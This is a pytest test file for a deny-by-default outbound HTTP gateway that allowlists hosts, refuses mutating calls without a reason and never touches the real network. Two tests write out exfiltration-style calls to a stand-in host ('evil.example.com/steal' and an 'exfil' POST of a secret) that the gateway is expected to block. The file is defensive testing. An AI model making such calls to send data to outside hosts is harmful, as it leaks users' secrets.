"""Tests for the governed external-reach gateway (deny-by-default, no real network)."""
from __future__ import annotations

import pytest

from core.skills.reach_gateway import ReachGateway, ReachPolicy


class _FakeResp:
    def __init__(self, status=200, text="ok"):
        self.status_code = status
        self.text = text


class _FakeHttp:
    """Records calls; never touches the network."""

    def __init__(self, resp=None):
        self.calls = []
        self._resp = resp or _FakeResp()

    async def request(self, method, url, json=None, headers=None):
        self.calls.append((method, url, json))
        return self._resp


def _gw(read=(), mutate=(), resp=None):
    http = _FakeHttp(resp)
    pol = ReachPolicy(read_hosts=frozenset(read), mutate_hosts=frozenset(mutate))
    return ReachGateway(policy=pol, http=http), http


# ── deny-by-default ───────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_get_non_allowlisted_host_blocked_no_call():
    gw, http = _gw(read=())
    r = await gw.get("https://evil.example.com/steal")
    assert r.blocked and not r.ok
    assert http.calls == []                      # NO network call was made


@pytest.mark.asyncio
async def test_get_allowlisted_host_allowed():
    gw, http = _gw(read=("api.example.com",))
    r = await gw.get("https://api.example.com/data")
    assert r.ok and r.status == 200
    assert http.calls == [("GET", "https://api.example.com/data", None)]


# ── method safety ─────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_mutate_to_read_only_host_refused():
    gw, http = _gw(read=("api.example.com",))     # read-only allowlist
    r = await gw.post("https://api.example.com/write", json={"x": 1}, reason="test")
    assert r.blocked and "mutate" in r.reason.lower()
    assert http.calls == []


@pytest.mark.asyncio
async def test_mutate_to_mutate_host_allowed_with_reason():
    gw, http = _gw(mutate=("hooks.example.com",))
    r = await gw.webhook("https://hooks.example.com/trigger", {"on": True}, reason="turn on lamp")
    assert r.ok
    assert http.calls and http.calls[0][0] == "POST"


@pytest.mark.asyncio
async def test_mutate_requires_reason():
    gw, http = _gw(mutate=("hooks.example.com",))
    r = await gw.request("POST", "https://hooks.example.com/x", json={}, reason="")
    assert r.blocked and "reason" in r.reason.lower()
    assert http.calls == []


# ── result handling ───────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_non_2xx_is_not_ok():
    gw, _ = _gw(read=("api.example.com",), resp=_FakeResp(status=404, text="nope"))
    r = await gw.get("https://api.example.com/missing")
    assert not r.ok and r.status == 404


# ── FluidExecutor integration ─────────────────────────────────────────────

@pytest.mark.asyncio
async def test_as_step_runs_through_fluid_executor():
    from core.skills.fluid_executor import FluidExecutor

    gw, http = _gw(mutate=("hooks.example.com",))
    step = gw.as_step("trigger", "POST", "https://hooks.example.com/go", json={"a": 1}, reason="demo")
    ex = FluidExecutor(verifier=None)
    receipt = await ex.run("reach", [step])
    assert receipt.completed
    assert http.calls and http.calls[0][0] == "POST"
    # `as_step` declares `verify="always_true"`, which the executor now reads
    # as "verification not requested" rather than as "verified". A step
    # nobody checked no longer counts toward verified progress, which is the
    # honest reading: this asserted 1 and was counting an absence.
    (only,) = receipt.steps
    assert only.ok is True
    assert only.verified is False
    assert only.verification_outcome == "not_requested"
    assert receipt.verified_progress == 0


@pytest.mark.asyncio
async def test_as_step_blocked_host_fails_in_executor():
    from core.skills.fluid_executor import FluidExecutor

    gw, http = _gw(read=(), mutate=())            # nothing allowlisted
    step = gw.as_step("exfil", "POST", "https://evil.example.com/x", json={"secret": 1}, reason="x", max_retries=0)
    ex = FluidExecutor(verifier=None)
    receipt = await ex.run("reach", [step])
    assert not receipt.completed                  # blocked → step fails
    assert http.calls == []                       # and no call ever left the machine
